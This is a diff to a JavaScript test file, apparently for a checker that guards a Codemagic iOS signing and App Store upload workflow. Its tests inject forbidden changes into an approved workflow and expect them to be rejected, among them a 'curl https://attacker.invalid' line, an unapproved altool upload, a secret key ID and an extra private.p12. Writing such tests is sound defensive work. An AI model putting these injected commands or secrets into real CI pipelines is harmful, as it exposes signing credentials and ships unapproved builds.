@@ -137,7 +137,7 @@ test('기기 서명 작업의 운영 주소·프로파일 바꿔치기·비공�
     approvedWorkflow.replace('https://172.30.1.25:8453', 'https://www.stiz-dasan.kr'),
     approvedWorkflow.replace('https://172.30.1.25:8453', 'https://172.30.1.12:8453'),
     approvedWorkflow.replace('profile: stiz-dasan-adhoc-sandbox-2026', 'profile: another-app'),
-    approvedWorkflow + '      - private.p12\n',
+    approvedWorkflow.replace('environment_variable: STIZ_SANDBOX_PROFILE', 'environment_variable: STIZ_SANDBOX_PROFILE\n          - private.p12'),
     approvedWorkflow.replace('native_signed_sandbox.py build', 'native_signed_sandbox.py skip-verification'),
     approvedWorkflow.replace('native_signed_sandbox.py build', 'native_signed_sandbox.py build\n          xcrun altool --upload-app --file unapproved.ipa'),
     approvedWorkflow.replace('CODE_SIGNING_ALLOWED=NO build', 'CODE_SIGNING_ALLOWED=NO build\n          arbitrary-command'),
@@ -158,4 +158,24 @@ test('추가 인증서와 자동 스토어 선택 방식의 혼용을 거부한�
     put(SOURCE_FILES.codemagic, invalid);
     assert.equal(inspectReadiness(root).localSafetyPassed, false);
   }
+});
+
+test('스토어 작업은 승인된 블록 그대로일 때만 통과하고 심사 제출·다른 키·자동 실행·비밀값은 차단한다', t => {
+  const { root, put } = fixture(t);
+  assert.equal(item(inspectReadiness(root), 'codemagic-store-upload').status, 'PASS');
+  const lastManual = approvedWorkflow.lastIndexOf('events: []');
+  for (const invalid of [
+    approvedWorkflow.replace('submit_to_app_store: false', 'submit_to_app_store: true'),
+    approvedWorkflow.replace('app_store_connect: upturnlabs-asc-key', 'app_store_connect: bdr-asc-key'),
+    approvedWorkflow.slice(0, lastManual) + 'events: [push]' + approvedWorkflow.slice(lastManual + 'events: []'.length),
+    approvedWorkflow.replace('bundle_identifier: kr.co.upturnlabs.stizdasan', 'bundle_identifier: kr.co.upturnlabs.stizdasan\n        APP_STORE_CONNECT_KEY_ID: SECRET'),
+    approvedWorkflow.replace('xcode-project use-profiles', 'xcode-project use-profiles\n          curl https://attacker.invalid'),
+    approvedWorkflow + '      - private.p12\n',
+  ]) {
+    put(SOURCE_FILES.codemagic, invalid);
+    assert.equal(inspectReadiness(root).localSafetyPassed, false);
+  }
+  // 업로드 설정을 시뮬레이터 작업으로 옮기면 무서명 경계 위반
+  put(SOURCE_FILES.codemagic, approvedWorkflow.replace('    artifacts:', '    publishing:\n      app_store_connect:\n        auth: integration\n    artifacts:'));
+  assert.equal(item(inspectReadiness(root), 'codemagic-manual-unsigned').status, 'BLOCKED');
 });
